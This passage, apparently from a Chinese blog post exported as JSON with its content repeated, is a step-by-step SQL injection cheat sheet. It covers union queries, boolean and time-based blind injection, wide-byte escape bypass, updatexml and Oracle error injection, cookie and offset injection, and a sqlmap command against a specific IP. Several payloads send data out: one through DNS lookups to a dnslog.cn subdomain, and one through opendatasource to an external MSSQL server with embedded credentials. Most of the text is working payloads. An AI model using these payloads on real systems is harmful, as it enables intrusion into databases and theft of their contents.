start=\"4\">\n<li>猜字段名</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">and</span> (ascii(substr((<span class=\"keyword\">select</span> <span class=\"built_in\">column_name</span> <span class=\"keyword\">from</span> information.<span class=\"keyword\">columns</span> <span class=\"keyword\">where</span> <span class=\"built_in\">table_name</span>=<span class=\"string\">&#x27;表名&#x27;</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>)))=<span class=\"number\">102</span>    // 返回正常，说明表中的列名称第一位是f</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>猜内容</li>\n</ol>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">and</span> (ascii(substr((select 字段名 from 表名 limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>)))=<span class=\"number\">122</span>    // 返回正常，说明表中列第一位是z</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"延时盲注\"><a href=\"#延时盲注\" class=\"headerlink\" title=\"延时盲注\"></a>延时盲注</h3><p>与布尔盲注类似，当注入后无论如何都没有变化时尝试，放在if()函数里面进行，通过有无延时判断是否正确</p>\n<figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and if((<span class=\"name\">length</span>(<span class=\"name\">database</span>()))&gt;n,sleep(<span class=\"number\">10</span>),<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x04-宽字节注入\"><a href=\"#0x04-宽字节注入\" class=\"headerlink\" title=\"0x04 宽字节注入\"></a><strong>0x04 宽字节注入</strong></h2><h3 id=\"PHP的防御函数\"><a href=\"#PHP的防御函数\" class=\"headerlink\" title=\"PHP的防御函数\"></a>PHP的防御函数</h3><p>magic_quotes_gpc(魔术引号开关)使数据库无法闭合注入，PHP5.4以上取消了魔术引号，后续版本有类似功能的函数</p>\n<p>这个函数的作用是在PHP中判断解析用户提交的数据，如果有post、get、cookie过来的数据就加上转义字符“\\”，来确保这些数据不会引起程序特别是数据库因为特殊字符引起的污染而出现致命的错误。</p>\n<p>单引号、双引号、反斜线与NULL等字符都会被加上反斜线</p>\n<h3 id=\"遇到了魔术引号\"><a href=\"#遇到了魔术引号\" class=\"headerlink\" title=\"遇到了魔术引号\"></a>遇到了魔术引号</h3><ol>\n<li>寻找不需要闭合的注入点</li>\n<li>使用宽字节注入</li>\n</ol>\n<p>宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码，那么就有可能产生宽字节注入</p>\n<p>发现输入’注释时有\\将之转义，这时在前面加一个%df可以将\\合起来变成一个汉字，从而达到注释的效果。</p>\n<p>通过16进制，子查询或者函数来替换有单引号的地方</p>\n<ol>\n<li>GET注入中在闭合符号前加上%df</li>\n<li>POST注入中在闭合符号前加上汉字</li>\n<li>修改brupsuite的hex中对应数的16进制值</li>\n</ol>\n<h2 id=\"0x05-报错注入-HEAD注入\"><a href=\"#0x05-报错注入-HEAD注入\" class=\"headerlink\" title=\"0x05 报错注入(HEAD注入)\"></a><strong>0x05 报错注入(HEAD注入)</strong></h2><h3 id=\"TIPS：只有知道账户密码的时候可用\"><a href=\"#TIPS：只有知道账户密码的时候可用\" class=\"headerlink\" title=\"TIPS：只有知道账户密码的时候可用\"></a><strong>TIPS：只有知道账户密码的时候可用</strong></h3><h3 id=\"PHP全局变量——超全局变量\"><a href=\"#PHP全局变量——超全局变量\" class=\"headerlink\" title=\"PHP全局变量——超全局变量\"></a>PHP全局变量——超全局变量</h3><p>PHP中的许多预定义变量都是”超全局的”，这意味着它们在一个脚本的全部脚本域中都可以使用。</p>\n<p>超全局变量：</p>\n<ul>\n<li>$_REQUEST(获取GET/POST/COOKIE)COOKIE在PHP5.4版本以上已经无法获取了</li>\n<li>$_POST(获取POST传参)</li>\n<li>$_GET(获取GET的传参)</li>\n<li>$_COOKIE(获取COOKIE的值)</li>\n<li>$_SERVER(包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组)功能强大</li>\n</ul>\n<p>常用的：</p>\n<ul>\n<li>$_SERVER[‘HTTP_REFERER’] 获取Referer请求头数据</li>\n<li>$_SERVER[“HTTP_USER_AGENT”] 获取用户相关信息，包括用户浏览器、操作系统等信息</li>\n<li>$_SERVER[“REMOTE_ADDR”] 浏览网页的用户IP</li>\n</ul>\n<h3 id=\"函数-1\"><a href=\"#函数-1\" class=\"headerlink\" title=\"函数\"></a>函数</h3><p>updatexml()更新xml文档的函数</p>\n<p>语法：updatexml(目标xml内容，xml文档路径，更新的内容)</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">updatexml</span>(<span class=\"number\">1</span>,concat(<span class=\"number\">0</span>x<span class=\"number\">7</span>e,(SELECT database()),<span class=\"number\">0</span>x<span class=\"number\">7</span>e),<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"attribute\">updatexml</span>(<span class=\"number\">1</span>,concat(<span class=\"number\">0</span>x<span class=\"number\">7</span>e,(SELECT table_name from information_schema.tables where table_schema = database() limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">0</span>x<span class=\"number\">7</span>e),<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"attribute\">updatexml</span>(<span class=\"number\">1</span>,concat(<span class=\"number\">0</span>x<span class=\"number\">7</span>e,(SELECT column_name from information_schema.columns where table_schema = database() and table_name = &#x27;表名&#x27; limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">0</span>x<span class=\"number\">7</span>e),<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"attribute\">updatexml</span>(<span class=\"number\">1</span>,concat(<span class=\"number\">0</span>x<span class=\"number\">7</span>e,(SELECT 字段名 from 表名 limit <span class=\"number\">1</span>,<span class=\"number\">1</span>),<span class=\"number\">0</span>x<span class=\"number\">7</span>e),<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"PS\"><a href=\"#PS\" class=\"headerlink\" title=\"PS\"></a>PS</h3><ol>\n<li>0x7e 实际是是16进制，Mysql支持16进制，但是开头得写0x  0x7e是一个特殊符号，然后不符合路径规则报错</li>\n<li>有时可以在请求头中加上X-Forwarded-For: 进行注入</li>\n</ol>\n<h2 id=\"0x06-Cookie注入\"><a href=\"#0x06-Cookie注入\" class=\"headerlink\" title=\"0x06 Cookie注入\"></a>0x06 Cookie注入</h2><h3 id=\"and等字符被拦截的情况下，asp、aspx、php-lt-5-4-45可用\"><a href=\"#and等字符被拦截的情况下，asp、aspx、php-lt-5-4-45可用\" class=\"headerlink\" title=\"and等字符被拦截的情况下，asp、aspx、php&lt;=5.4.45可用\"></a>and等字符被拦截的情况下，asp、aspx、php&lt;=5.4.45可用</h3><p>开发滥用$_REQUEST引起的，使用Cookie注入需要URL编码</p>\n<p>在开发者工具中找到Cookie设置ID和值，再将get传参的?id=1删去，发现还是可以正常访问，说明存在Cookie注入。</p>\n<h3 id=\"设置Cookie，需要URL编码\"><a href=\"#设置Cookie，需要URL编码\" class=\"headerlink\" title=\"设置Cookie，需要URL编码\"></a>设置Cookie，需要URL编码</h3><ol>\n<li>按F12，在浏览器中修改Cookie</li>\n<li>使用BrupSuite抓包修改Cookie，在后面加上; id=171发现和get传参的结果一样</li>\n<li>通过Js，document.cookie=”id=”+escape(“171 order by 1”)</li>\n</ol>\n<p>Access查询必须后带表名，而一开始并不知道表名，union select 1,2,3,4 from 表名，这时有两个办法解决：</p>\n<ul>\n<li>查询系统自带库【MySQL MsSQL Oracle】都可以这样做，但是Access是淘汰的数据库，所以没办法，只能用第二个办法</li>\n<li>强猜 admin news user job,但是Access数据库在使用union select时可能会出错，所以一般使用 and exists (select*from 表名)判断表名，可以利用BurpSuite跑字典跑出表名</li>\n</ul>\n<p>之后要查出表内内容有两个办法：</p>\n<ul>\n<li>强猜，猜测表内有什么字段</li>\n<li>偏移注入</li>\n</ul>\n<h3 id=\"sqlmap跑Cookie注入\"><a href=\"#sqlmap跑Cookie注入\" class=\"headerlink\" title=\"sqlmap跑Cookie注入\"></a>sqlmap跑Cookie注入</h3><figure class=\"highlight dsconfig\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">sqlmap</span>.<span class=\"string\">py</span> -<span class=\"string\">u</span> <span class=\"string\">&quot;http://59.63.200.79:8004/shownews.asp&quot;</span> <span class=\"built_in\">--cookie</span> <span class=\"string\">&quot;id=171&quot;</span> <span class=\"built_in\">--level</span> <span class=\"string\">2</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x07-偏移注入\"><a href=\"#0x07-偏移注入\" class=\"headerlink\" title=\"0x07 偏移注入\"></a>0x07 偏移注入</h2><h3 id=\"使用场景\"><a href=\"#使用场景\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h3><p>在SQL注入的时候会碰到一些无法查询列名的情况，比如</p>\n<ul>\n<li>系统自带数据库的权限不够而无法访问系统自带库。</li>\n<li>当猜到表名但是无法猜到字段名的时候，可以使用偏移注入来查询表里的数据。</li>\n</ul>\n<p>表名.<em>：</em>在数据库中代表一切；.代表向下</p>\n<h3 id=\"使用步骤\"><a href=\"#使用步骤\" class=\"headerlink\" title=\"使用步骤\"></a>使用步骤</h3><figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"keyword\">admin</span>.* <span class=\"keyword\">from</span> <span class=\"keyword\">admin</span>    // 放在不同的回显点显示不同的字段的内容，回显点包含在<span class=\"keyword\">admin</span>.*内</span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"keyword\">admin</span>.*,<span class=\"number\">10</span> <span class=\"keyword\">from</span> <span class=\"keyword\">admin</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x08-DNS注入\"><a href=\"#0x08-DNS注入\" class=\"headerlink\" title=\"0x08 DNS注入\"></a>0x08 DNS注入</h2><h3 id=\"使用场景-1\"><a href=\"#使用场景-1\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h3><p>无法直接利用漏洞获得回显，但是目标可以发起请求，此时就可以通过DNS请求的方法将想获得的数据外带出来。</p>\n<p>核心：将盲注转化为显错注入</p>\n<p>MySQL必须打开<code>secure_file_priv= </code> </p>\n<h3 id=\"函数解析\"><a href=\"#函数解析\" class=\"headerlink\" title=\"函数解析\"></a>函数解析</h3><p>load_file()读取文件</p>\n<figure class=\"highlight reasonml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select load<span class=\"constructor\">_file(&#x27;<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"params\">error</span>.1806dl.<span class=\"params\">dnslog</span>.<span class=\"params\">cn</span><span class=\"operator\">/</span><span class=\"params\">bc</span>&#x27;)</span>;</span><br><span class=\"line\">select load<span class=\"constructor\">_file(<span class=\"params\">concat</span>(&#x27;<span class=\"operator\">/</span><span class=\"operator\">/</span>&#x27;,(<span class=\"params\">select</span> <span class=\"params\">database</span>()</span>),&#x27;.<span class=\"number\">1806</span>dl.dnslog.cn/bc&#x27;));</span><br></pre></td></tr></table></figure>\n\n<p>dnslog.cn   // 网站</p>\n<h2 id=\"0x9-反弹注入\"><a href=\"#0x9-反弹注入\" class=\"headerlink\" title=\"0x9 反弹注入\"></a><strong>0x9 反弹注入</strong></h2><h3 id=\"使用场景-2\"><a href=\"#使用场景-2\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h3><p>页面没东西显示的盲注</p>\n<p>明明是SQL的注入点却无发进行注入，注入工具猜解的速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是在注入攻击中常常遇到的问题。为了解决这些问题，比较好的解决方法是使用反弹注入技术，而反弹注入技术需要依靠opendatasource函数。</p>\n<p>反弹注入就是把查询出来的数据发送到我们的MSSQL数据库上，此时就需要自己的MSSQL数据库和一个公网IP。</p>\n<h3 id=\"显错注入\"><a href=\"#显错注入\" class=\"headerlink\" title=\"显错注入\"></a>显错注入</h3><ol>\n<li>猜字段</li>\n<li>联合查询，要写union all select</li>\n<li>输出点要用null填充</li>\n<li>注释只有–+</li>\n<li>sysobjects查询系统表 union all select id,name,null from sysobjects where xtype =U –+</li>\n<li>syscolumns字段 union all select id,name,null from syscolumns where id=id –+</li>\n<li>查询信息 union all select id,passwd,token from admin –+</li>\n</ol>\n<h3 id=\"反弹注入\"><a href=\"#反弹注入\" class=\"headerlink\" title=\"反弹注入\"></a>反弹注入</h3><figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;;<span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> opendatasource(<span class=\"string\">&#x27;sqloledb&#x27;</span>,<span class=\"string\">&#x27;server=den1.mssql8.gear.host,1433;uid=xyzxyz;pwd=Ct27!_nXWji4;database=xyzxyz&#x27;</span>).xyzxyz.dbo.test <span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> admin --</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x10-报错注入\"><a href=\"#0x10-报错注入\" class=\"headerlink\" title=\"0x10 报错注入\"></a>0x10 报错注入</h2><h3 id=\"Orcale可用\"><a href=\"#Orcale可用\" class=\"headerlink\" title=\"Orcale可用\"></a>Orcale可用</h3><p>dual是一个虚表，直接查询他只显示一个X，列名为dummy</p>\n<p>dual实际上是为了满足查询语句的结构产生的</p>\n<p>查询用户名：select user from dual</p>\n<p>调用系统函数：(获得随机值：select dbms_random.random from dual)</p>\n<p>做加减法： select 9+1 from dual</p>\n<p>查询出所有的表：union all select * from all_tables</p>\n<p>查询出当前用户的表：select * from user_tables</p>\n<p>查询出所有的字段：select * from all_tab_columns</p>\n<p>查询出当前用户的字段：select * from user_tab_columns</p>\n<p>查版本：select * from v$version</p>\n<p>rownum=1 (限制查询返回的总行数为一条)</p>\n<p>Oracle中&lt;&gt;和!=都是不等于</p>\n<p>to_nchar()转换进制</p>\n<h3 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h3><p>不用管有没有输出点</p>\n<p>不用管数据类型</p>\n<p>不用管字段数</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctxsys.drithsx.sn(<span class=\"keyword\">user</span>,(<span class=\"keyword\">select</span> banner <span class=\"keyword\">from</span> v$<span class=\"keyword\">version</span> <span class=\"keyword\">where</span> rownum = <span class=\"number\">1</span>))</span><br></pre></td></tr></table></figure>\n\n<p>查询关于主题的对应关键词，然后因为查询失败爆出想要查询的内容</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span>=ctxsys.drithsx.sn(<span class=\"number\">1</span>,(<span class=\"keyword\">select</span> <span class=\"built_in\">table_name</span> <span class=\"keyword\">from</span> user_tables <span class=\"keyword\">where</span> rownum=<span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"built_in\">table_name</span>&lt;&gt;<span class=\"string\">&#x27;NEWS&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-SQL注入原理\"><a href=\"#0x01-SQL注入原理\" class=\"headerlink\" title=\"0x01 SQL注入原理\"></a>0x01 SQL注入原理</h2><p>用户输入的数据被当作代码执行</p>\n<h2 id=\"0x02-基本手工注入流程\"><a href=\"#0x02-基本手工注入流程\" class=\"headerlink\" title=\"0x02 基本手工注入流程\"></a>0x02 基本手工注入流程</h2><h3 id=\"判断注入点\"><a href=\"#判断注入点\" class=\"headerlink\" title=\"判断注入点\"></a>判断注入点</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">数字型：<span class=\"attribute\">id</span>=2-1、and <span class=\"attribute\">1</span>=1、and <span class=\"attribute\">1</span>=2、and <span class=\"attribute\">-1</span>=-2、and 1&gt;0、<span class=\"keyword\">or</span> <span class=\"attribute\">1</span>=1 <span class=\"built_in\">..</span><span class=\"built_in\">..</span><span class=\"built_in\">..</span></span><br><span class=\"line\">字符型：<span class=\"string\">&#x27;、&#x27;</span>)、<span class=\"string\">&#x27;))、)、&quot;、&quot;)、&quot;))</span></span><br><span class=\"line\"><span class=\"string\">注释符：-- qwe、/**/、#</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><figure class=\"highlight crmsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">order</span> <span class=\"title\">by</span> n</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查看回显点\"><a href=\"#查看回显点\" class=\"headerlink\" title=\"查看回显点\"></a>查看回显点</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">and</span> <span class=\"number\">1</span>=<span class=\"number\">2</span> union select <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,......,n</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查看数据库名称-假设n是回显点\"><a href=\"#查看数据库名称-假设n是回显点\" class=\"headerlink\" title=\"查看数据库名称(假设n是回显点)\"></a>查看数据库名称(假设n是回显点)</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">and</span> <span class=\"number\">1</span>=<span class=\"number\">2</span> union select <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,......,database()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查看表名\"><a href=\"#查看表名\" class=\"headerlink\" title=\"查看表名\"></a>查看表名</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">and</span> <span class=\"number\">1</span>=<span class=\"number\">2</span> union select <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,......,table_name from information_schema.tables where table_schema = database() limit <span class=\"number\">0</span>,<span class=\"number\">1</span>    // limit <span class=\"number\">0</span>,<span class=\"number\">1</span> <span class=\"number\">0</span>是从哪开始,<span class=\"number\">1</span>是显示几个</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查看字段名\"><a href=\"#查看字段名\" class=\"headerlink\" title=\"查看字段名\"></a>查看字段名</h3><figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,......,column_name <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_schema = <span class=\"keyword\">database</span>() <span class=\"keyword\">and</span> table_name = <span class=\"string\">&#x27;表名&#x27;</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查看字段内容\"><a href=\"#查看字段内容\" class=\"headerlink\" title=\"查看字段内容\"></a>查看字段内容</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">union</span> select <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,......,字段名 from 表名 limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x03-盲注-布尔盲注、延时盲注\"><a href=\"#0x03-盲注-布尔盲注、延时盲注\" class=\"headerlink\" title=\"0x03 盲注(布尔盲注、延时盲注)\"></a><strong>0x03 盲注(布尔盲注、延时盲注)</strong></h2><p>在使用and 1=1 和 and 1=2时发现可能存在注入，但是并没有回显点的时候可以尝试使用布尔盲注。</p>\n<p>当使用and 1=1 和 and 1=2时发现都出现正确页面，可能存在延时盲注，需要进一步测试</p>\n<h3 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h3><ol>\n<li>length()</li>\n</ol>\n<p>返回字符串的长度</p>\n<ol start=\"2\">\n<li>substr()</li>\n</ol>\n<p>截取字符串。语法：substr(str,pos,len)</p>\n<ol start=\"3\">\n<li>ascii()</li>\n</ol>\n<p>返回字符的ascii码【将字符变为数字】</p>\n<ol start=\"4\">\n<li>sleep()</li>\n</ol>\n<p>将程序挂起一段时间n，n为n秒</p>\n<ol start=\"5\">\n<li>if(expr1,expr2,expr3)</li>\n</ol>\n<p>判断语句：如果第一个语句正确就执行第二个语句，否则就执行第三个语句</p>\n<h3 id=\"布尔盲注\"><a href=\"#布尔盲注\" class=\"headerlink\" title=\"布尔盲注\"></a>布尔盲注</h3><ol>\n<li>猜解当前数据库名称长度</li>\n</ol>\n<figure class=\"highlight isbl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\"><span class=\"keyword\">and</span></span> (<span class=\"function\"><span class=\"title\"><span class=\"built_in\">length</span></span>(<span class=\"title\">database</span>()))&gt;<span class=\"number\">9</span></span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>利用ASCII码猜解当前数据库名称</li>\n</ol>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">and</span> (ascii(substr(database(),<span class=\"number\">1</span>,<span class=\"number\">1</span>)))=<span class=\"number\">115</span>   // 返回正常，说明数据库名称第一位是s</span><br><span class=\"line\"><span class=\"attribute\">and</span> (ascii(substr(database(),<span class=\"number\">2</span>,<span class=\"number\">1</span>)))=<span class=\"number\">101</span>    // 返回正常，说明数据库名称第二位是e</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>猜表名</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">and</span> (ascii((substr(<span class=\"keyword\">select</span> <span class=\"built_in\">table_name</span> <span class=\"keyword\">from</span> information_schema.<span class=\"keyword\">tables</span> <span class=\"keyword\">where</span> table_schema=<span class=\"keyword\">database</span>() <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>)))=<span class=\"number\">101</span>    // 返回正常，说明数据表名的第一个第一位是e</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>猜字段名</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">and</span> (ascii(substr((<span class=\"keyword\">select</span> <span class=\"built_in\">column_name</span> <span class=\"keyword\">from</span> information.<span class=\"keyword\">columns</span> <span class=\"keyword\">where</span> <span class=\"built_in\">table_name</span>=<span class=\"string\">&#x27;表名&#x27;</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>)))=<span class=\"number\">102</span>    // 返回正常，说明表中的列名称第一位是f</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>猜内容</li>\n</ol>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">and</span> (ascii(substr((select 字段名 from 表名 limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>)))=<span class=\"number\">122</span>    // 返回正常，说明表中列第一位是z</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"延时盲注\"><a href=\"#延时盲注\" class=\"headerlink\" title=\"延时盲注\"></a>延时盲注</h3><p>与布尔盲注类似，当注入后无论如何都没有变化时尝试，放在if()函数里面进行，通过有无延时判断是否正确</p>\n<figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and if((<span class=\"name\">length</span>(<span class=\"name\">database</span>()))&gt;n,sleep(<span class=\"number\">10</span>),<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x04-宽字节注入\"><a href=\"#0x04-宽字节注入\" class=\"headerlink\" title=\"0x04 宽字节注入\"></a><strong>0x04 宽字节注入</strong></h2><h3 id=\"PHP的防御函数\"><a href=\"#PHP的防御函数\" class=\"headerlink\" title=\"PHP的防御函数\"></a>PHP的防御函数</h3><p>magic_quotes_gpc(魔术引号开关)使数据库无法闭合注入，PHP5.4以上取消了魔术引号，后续版本有类似功能的函数</p>\n<p>这个函数的作用是在PHP中判断解析用户提交的数据，如果有post、get、cookie过来的数据就加上转义字符“\\”，来确保这些数据不会引起程序特别是数据库因为特殊字符引起的污染而出现致命的错误。</p>\n<p>单引号、双引号、反斜线与NULL等字符都会被加上反斜线</p>\n<h3 id=\"遇到了魔术引号\"><a href=\"#遇到了魔术引号\" class=\"headerlink\" title=\"遇到了魔术引号\"></a>遇到了魔术引号</h3><ol>\n<li>寻找不需要闭合的注入点</li>\n<li>使用宽字节注入</li>\n</ol>\n<p>宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码，那么就有可能产生宽字节注入</p>\n<p>发现输入’注释时有\\将之转义，这时在前面加一个%df可以将\\合起来变成一个汉字，从而达到注释的效果。</p>\n<p>通过16进制，子查询或者函数来替换有单引号的地方</p>\n<ol>\n<li>GET注入中在闭合符号前加上%df</li>\n<li>POST注入中在闭合符号前加上汉字</li>\n<li>修改brupsuite的hex中对应数的16进制值</li>\n</ol>\n<h2 id=\"0x05-报错注入-HEAD注入\"><a href=\"#0x05-报错注入-HEAD注入\" class=\"headerlink\" title=\"0x05 报错注入(HEAD注入)\"></a><strong>0x05 报错注入(HEAD注入)</strong></h2><h3 id=\"TIPS：只有知道账户密码的时候可用\"><a href=\"#TIPS：只有知道账户密码的时候可用\" class=\"headerlink\" title=\"TIPS：只有知道账户密码的时候可用\"></a><strong>TIPS：只有知道账户密码的时候可用</strong></h3><h3 id=\"PHP全局变量——超全局变量\"><a href=\"#PHP全局变量——超全局变量\" class=\"headerlink\" title=\"PHP全局变量——超全局变量\"></a>PHP全局变量——超全局变量</h3><p>PHP中的许多预定义变量都是”超全局的”，这意味着它们在一个脚本的全部脚本域中都可以使用。</p>\n<p>超全局变量：</p>\n<ul>\n<li>$_REQUEST(获取GET/POST/COOKIE)COOKIE在PHP5.4版本以上已经无法获取了</li>\n<li>$_POST(获取POST传参)</li>\n<li>$_GET(获取GET的传参)</li>\n<li>$_COOKIE(获取COOKIE的值)</li>\n<li>$_SERVER(包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组)功能强大</li>\n</ul>\n<p>常用的：</p>\n<ul>\n<li>$_SERVER[‘HTTP_REFERER’] 获取Referer请求头数据</li>\n<li>$_SERVER[“HTTP_USER_AGENT”] 获取用户相关信息，包括用户浏览器、操作系统等信息</li>\n<li>$_SERVER[“REMOTE_ADDR”] 浏览网页的用户IP</li>\n</ul>\n<h3 id=\"函数-1\"><a href=\"#函数-1\" class=\"headerlink\" title=\"函数\"></a>函数</h3><p>updatexml()更新xml文档的函数</p>\n<p>语法：updatexml(目标xml内容，xml文档路径，更新的内容)</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">updatexml</span>(<span class=\"number\">1</span>,concat(<span class=\"number\">0</span>x<span class=\"number\">7</span>e,(SELECT database()),<span class=\"number\">0</span>x<span class=\"number\">7</span>e),<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"attribute\">updatexml</span>(<span class=\"number\">1</span>,concat(<span class=\"number\">0</span>x<span class=\"number\">7</span>e,(SELECT table_name from information_schema.tables where table_schema = database() limit <span class=\"number\">0</span>,<span 